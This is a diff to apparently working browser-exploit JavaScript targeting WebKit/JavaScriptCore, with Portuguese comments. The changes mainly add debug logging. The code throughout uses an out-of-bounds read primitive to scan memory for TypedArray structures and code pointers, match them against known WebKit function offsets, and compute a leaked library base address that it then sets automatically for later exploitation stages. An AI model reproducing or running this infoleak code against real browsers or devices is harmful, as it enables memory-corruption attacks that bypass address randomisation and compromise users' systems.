@@ -43,13 +43,13 @@ export function setLeakedWebKitBaseAddress(baseAddrHex) {
 }
 
 async function scanForTypedArrays(currentCandidateBaseRelOffset, logFn) {
-    let vtable_ptr, m_mode_val, m_length_val, m_vector_ptr, m_buffer_ptr; // Declarar aqui para ter escopo no catch se necessário
+    let vtable_ptr, m_mode_val, m_length_val, m_vector_ptr, m_buffer_ptr;
 
     try {
         const vtableReadOffset = currentCandidateBaseRelOffset + (JSC_OFFSETS.TypedArray.VTABLE_OFFSET || 0);
         vtable_ptr = Core.oob_read_relative(vtableReadOffset, 8);
-        // Adicionando verificação defensiva para vtable_ptr
-        if (vtable_ptr !== undefined && !(vtable_ptr instanceof AdvancedInt64)) {
+        logFn(`DEBUG: scanForTypedArrays @ ${toHexS1(currentCandidateBaseRelOffset)}, vtable_ptr raw: ${String(vtable_ptr)}, typeof: ${typeof vtable_ptr}, instanceof AdvInt64: ${vtable_ptr instanceof AdvancedInt64}, has isNullPtr: ${!!(vtable_ptr && vtable_ptr.isNullPtr)}`, 'info', `${FNAME_BASE}.DebugTA`);
+        if (vtable_ptr !== undefined && vtable_ptr !== null && !(vtable_ptr instanceof AdvancedInt64)) {
             throw new TypeError(`vtable_ptr não é AdvancedInt64. Tipo: ${typeof vtable_ptr}, Valor: ${String(vtable_ptr)}`);
         }
 
@@ -71,25 +71,21 @@ async function scanForTypedArrays(currentCandidateBaseRelOffset, logFn) {
 
         const vectorReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET;
         m_vector_ptr = Core.oob_read_relative(vectorReadOffset, 8);
-
-        // ** VERIFICAÇÃO DEFENSIVA ADICIONADA AQUI **
-        if (m_vector_ptr !== undefined && !(m_vector_ptr instanceof AdvancedInt64)) {
-            logFn(`AVISO: m_vector_ptr lido de offset ${toHexS1(vectorReadOffset)} não é uma instância de AdvancedInt64. Tipo: ${typeof m_vector_ptr}, Valor: ${String(m_vector_ptr)}`, 'warn', `${FNAME_BASE}.scanForTypedArrays`);
-            // Lança um erro específico para ser pego pelo catch e logado corretamente,
-            // em vez de deixar o erro original "isNullPtr is not a function" acontecer.
-            throw new TypeError(`m_vector_ptr (lido de ${toHexS1(vectorReadOffset)}) não é AdvancedInt64.`);
+        logFn(`DEBUG: scanForTypedArrays @ ${toHexS1(currentCandidateBaseRelOffset)}, m_vector_ptr raw: ${String(m_vector_ptr)}, typeof: ${typeof m_vector_ptr}, instanceof AdvInt64: ${m_vector_ptr instanceof AdvancedInt64}, has isNullPtr: ${!!(m_vector_ptr && m_vector_ptr.isNullPtr)}`, 'info', `${FNAME_BASE}.DebugTA`);
+        if (m_vector_ptr !== undefined && m_vector_ptr !== null && !(m_vector_ptr instanceof AdvancedInt64)) {
+            throw new TypeError(`m_vector_ptr (lido de ${toHexS1(vectorReadOffset)}) não é AdvancedInt64. Tipo: ${typeof m_vector_ptr}, Valor: ${String(m_vector_ptr)}`);
         }
 
         const typeName = TYPED_ARRAY_MODES[m_mode_val] || null;
-        // A verificação m_vector_ptr && agora é mais segura
         const isLengthPlausible = typeof m_length_val === 'number' && m_length_val > 0 && m_length_val < (1024 * 1024 * 32);
+        // Adiciona verificação explícita se m_vector_ptr é uma instância antes de chamar métodos
         const isVectorPlausible = m_vector_ptr && (m_vector_ptr instanceof AdvancedInt64) && !m_vector_ptr.isNullPtr() && !m_vector_ptr.isNegativeOne() && m_vector_ptr.greaterThanOrEqual(new AdvancedInt64(0x1000, 0));
 
         if (typeName && isLengthPlausible && isVectorPlausible) {
             const bufferPtrReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.ASSOCIATED_ARRAYBUFFER_OFFSET;
             m_buffer_ptr = Core.oob_read_relative(bufferPtrReadOffset, 8);
-            // Adicionando verificação defensiva para m_buffer_ptr
-            if (m_buffer_ptr !== undefined && !(m_buffer_ptr instanceof AdvancedInt64)) {
+            logFn(`DEBUG: scanForTypedArrays @ ${toHexS1(currentCandidateBaseRelOffset)}, m_buffer_ptr raw: ${String(m_buffer_ptr)}, typeof: ${typeof m_buffer_ptr}, instanceof AdvInt64: ${m_buffer_ptr instanceof AdvancedInt64}, has isNullPtr: ${!!(m_buffer_ptr && m_buffer_ptr.isNullPtr)}`, 'info', `${FNAME_BASE}.DebugTA`);
+            if (m_buffer_ptr !== undefined && m_buffer_ptr !== null && !(m_buffer_ptr instanceof AdvancedInt64)) {
                 throw new TypeError(`m_buffer_ptr não é AdvancedInt64. Tipo: ${typeof m_buffer_ptr}, Valor: ${String(m_buffer_ptr)}`);
             }
 
@@ -100,8 +96,8 @@ async function scanForTypedArrays(currentCandidateBaseRelOffset, logFn) {
                     type: "TypedArray",
                     gapOrRelativeOffset: currentCandidateBaseRelOffset,
                     m_mode: m_mode_val, typeName: typeName, m_length: m_length_val,
-                    m_vector_hex: m_vector_ptr.toString(true), // Seguro chamar toString se for AdvancedInt64
-                    m_buffer_hex: m_buffer_ptr.toString(true), // Seguro chamar toString se for AdvancedInt64
+                    m_vector_hex: m_vector_ptr.toString(true),
+                    m_buffer_hex: m_buffer_ptr.toString(true),
                     vtable_ptr_hex: vtable_ptr ? vtable_ptr.toString(true) : "N/A",
                     vtable_match: vtableMatch
                 };
@@ -109,24 +105,25 @@ async function scanForTypedArrays(currentCandidateBaseRelOffset, logFn) {
             }
         }
     } catch (e) { 
-        // Loga a mensagem do erro que foi lançado (seja o RangeError de oob_read_relative ou o TypeError da verificação)
         if (!(e instanceof RangeError && e.message.toLowerCase().includes("fora dos limites do buffer real"))) {
-            logFn(`Erro informativo durante scanForTypedArrays em ${toHexS1(currentCandidateBaseRelOffset)}: ${e.message}`, 'info', `${FNAME_BASE}.scanForTypedArrays`);
+            logFn(`Erro informativo durante scanForTypedArrays em ${toHexS1(currentCandidateBaseRelOffset)}: ${e.name} - ${e.message}`, 'info', `${FNAME_BASE}.scanForTypedArrays`);
+            // console.error(`StackTrace para erro em scanForTypedArrays (offset ${toHexS1(currentCandidateBaseRelOffset)}):`, e); // Para depuração mais profunda
         }
-        // Se quiser ver o stack trace no console do navegador para depuração mais profunda:
-        // console.error(`Erro em scanForTypedArrays (offset ${toHexS1(currentCandidateBaseRelOffset)}):`, e);
     }
     return null;
 }
 
 async function scanForCodePointers(currentCandidateBaseRelOffset, logFn) {
+    let potentialPtr;
     try {
-        const potentialPtr = Core.oob_read_relative(currentCandidateBaseRelOffset, 8);
-        if (potentialPtr !== undefined && !(potentialPtr instanceof AdvancedInt64)) {
+        potentialPtr = Core.oob_read_relative(currentCandidateBaseRelOffset, 8);
+        logFn(`DEBUG: scanForCodePointers @ ${toHexS1(currentCandidateBaseRelOffset)}, potentialPtr raw: ${String(potentialPtr)}, typeof: ${typeof potentialPtr}, instanceof AdvInt64: ${potentialPtr instanceof AdvancedInt64}, has isNullPtr: ${!!(potentialPtr && potentialPtr.isNullPtr)}`, 'info', `${FNAME_BASE}.DebugCP`);
+        if (potentialPtr !== undefined && potentialPtr !== null && !(potentialPtr instanceof AdvancedInt64)) {
             throw new TypeError(`potentialPtr (para CodePointer) não é AdvancedInt64. Tipo: ${typeof potentialPtr}`);
         }
 
         if (potentialPtr && (potentialPtr instanceof AdvancedInt64) && !potentialPtr.isNullPtr() && !potentialPtr.isNegativeOne()) {
+            // ... (lógica de verificação de ponteiro de código como antes)
             if (leakedWebKitBaseAddress) {
                 for (const segment of WEBKIT_LIBRARY_INFO.SEGMENTS) {
                     const segStart = leakedWebKitBaseAddress.add(AdvancedInt64.fromHex(segment.vaddr_start_hex));
@@ -135,14 +132,14 @@ async function scanForCodePointers(currentCandidateBaseRelOffset, logFn) {
                         for (const [funcName, funcOffsetHex] of Object.entries(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS)) {
                             const funcAbsoluteAddr = leakedWebKitBaseAddress.add(AdvancedInt64.fromHex(funcOffsetHex));
                             if (potentialPtr.equals(funcAbsoluteAddr)) {
-                                return { /* ... como antes ... */
+                                return {
                                     type: "CodePointer (Exact Match)", gapOrRelativeOffset: currentCandidateBaseRelOffset,
                                     leakedPtrHex: potentialPtr.toString(true), knownFunction: funcName,
                                     libraryBaseHex: leakedWebKitBaseAddress.toString(true)
                                 };
                             }
                         }
-                        return { /* ... como antes ... */
+                        return {
                             type: "CodePointer (In-Segment)", gapOrRelativeOffset: currentCandidateBaseRelOffset,
                             leakedPtrHex: potentialPtr.toString(true), segmentName: segment.name,
                             libraryBaseHex: leakedWebKitBaseAddress.toString(true)
@@ -154,7 +151,7 @@ async function scanForCodePointers(currentCandidateBaseRelOffset, logFn) {
                     const funcOffsetInt64 = AdvancedInt64.fromHex(funcOffsetHex);
                     const potentialBaseAddr = potentialPtr.sub(funcOffsetInt64);
                     if ((potentialBaseAddr.low() & 0xFFF) === 0 && potentialBaseAddr.greaterThanOrEqual(new AdvancedInt64(0x10000000,0))) {
-                        return { /* ... como antes ... */
+                        return {
                             type: "CodePointer (Base Calculated)", gapOrRelativeOffset: currentCandidateBaseRelOffset,
                             leakedPtrHex: potentialPtr.toString(true), calculatedBaseHex: potentialBaseAddr.toString(true),
                             probableFunction: funcName, functionOffset: funcOffsetHex
@@ -165,7 +162,7 @@ async function scanForCodePointers(currentCandidateBaseRelOffset, logFn) {
         }
     } catch (e) {
         if (!(e instanceof RangeError && e.message.toLowerCase().includes("fora dos limites do buffer real"))) {
-            logFn(`Erro informativo durante scanForCodePointers em ${toHexS1(currentCandidateBaseRelOffset)}: ${e.message}`, 'info', `${FNAME_BASE}.scanForCodePointers`);
+            logFn(`Erro informativo durante scanForCodePointers em ${toHexS1(currentCandidateBaseRelOffset)}: ${e.name} - ${e.message}`, 'info', `${FNAME_BASE}.scanForCodePointers`);
         }
     }
     return null;
@@ -173,7 +170,7 @@ async function scanForCodePointers(currentCandidateBaseRelOffset, logFn) {
 
 export async function scanMemory(scanStartRelOffset, scanRangeBytes, stepBytes = 8, scanConfig = {typedArrays: true, codePointers: false}) {
     const FNAME_SCAN = `${FNAME_BASE}.scanMemory`;
-    appLog(`--- Iniciando ${FNAME_SCAN} ---`, 'test', FNAME_SCAN); // Usa appLog
+    appLog(`--- Iniciando ${FNAME_SCAN} ---`, 'test', FNAME_SCAN);
     updateOOBConfigFromUI(); 
     
     if (!Core.oob_array_buffer_real || 
@@ -198,7 +195,7 @@ export async function scanMemory(scanStartRelOffset, scanRangeBytes, stepBytes =
     const lastFieldStructureOffset = Math.max(
         JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET, JSC_OFFSETS.TypedArray.M_LENGTH_OFFSET,
         JSC_OFFSETS.TypedArray.M_MODE_OFFSET, JSC_OFFSETS.TypedArray.ASSOCIATED_ARRAYBUFFER_OFFSET,
-        (JSC_OFFSETS.TypedArray.VTABLE_OFFSET || 0) // Inclui VTABLE_OFFSET se definido
+        (JSC_OFFSETS.TypedArray.VTABLE_OFFSET || 0)
     ) + 8;
     const safeBaseCandidateLimitRelative = (Core.oob_array_buffer_real.byteLength - OOB_CONFIG.BASE_OFFSET_IN_DV) + OOB_CONFIG.INITIAL_BUFFER_SIZE - lastFieldStructureOffset;
 
@@ -219,9 +216,9 @@ export async function scanMemory(scanStartRelOffset, scanRangeBytes, stepBytes =
             if (taCandidate) {
                 candidates.push(taCandidate);
                 foundThisIteration = taCandidate;
-                 if (taCandidate.vtable_match) {
+                 if (taCandidate.vtable_match) { // Log específico se VTable coincidir
                      appLog(`   CANDIDATO TYPEDARRAY (VTABLE MATCH!): GAP/OffsetRel: ${toHexS1(taCandidate.gapOrRelativeOffset)}, Tipo: ${taCandidate.typeName}, VTable: ${taCandidate.vtable_ptr_hex}`, 'good', FNAME_SCAN);
-                } else {
+                } else { // Log geral para candidato TypedArray encontrado
                      appLog(`   Candidato TypedArray Encontrado: GAP/OffsetRel: ${toHexS1(taCandidate.gapOrRelativeOffset)}, Tipo: ${taCandidate.typeName}, VTable Lida: ${taCandidate.vtable_ptr_hex}`, 'leak', FNAME_SCAN);
                 }
             }
@@ -289,7 +286,7 @@ export async function findVictimButtonHandler() {
                 appLog(`  - TypedArray: GAP/Offset: ${toHexS1(c.gapOrRelativeOffset)} | Tipo: ${c.typeName} (${toHexS1(c.m_mode,2)}) | Len: ${c.m_length} | Vec: ${c.m_vector_hex} | VTable: ${c.vtable_ptr_hex || 'N/Lida'} ${c.vtable_match ? '(MATCH!)' : ''}`, "analysis", FNAME_HANDLER);
             } else if (c.type && c.type.includes("CodePointer")) {
                 appLog(`  - CodePointer: OffsetScan ${toHexS1(c.gapOrRelativeOffset)} | Ptr: ${c.leakedPtrHex} | BaseCalc: ${c.calculatedBaseHex} (Função: ${c.probableFunction || c.knownFunction || c.segmentName || 'N/A'})`, "leak", FNAME_HANDLER);
-                if (c.calculatedBaseHex && !leakedWebKitBaseAddress) {
+                if (c.calculatedBaseHex && !leakedWebKitBaseAddress) { // Auto-seta a base se uma for calculada e nenhuma estiver definida
                     const leakedWebKitBaseHexEl = document.getElementById('leakedWebKitBaseHex');
                     if (leakedWebKitBaseHexEl) leakedWebKitBaseHexEl.value = c.calculatedBaseHex;
                     setLeakedWebKitBaseAddress(c.calculatedBaseHex);
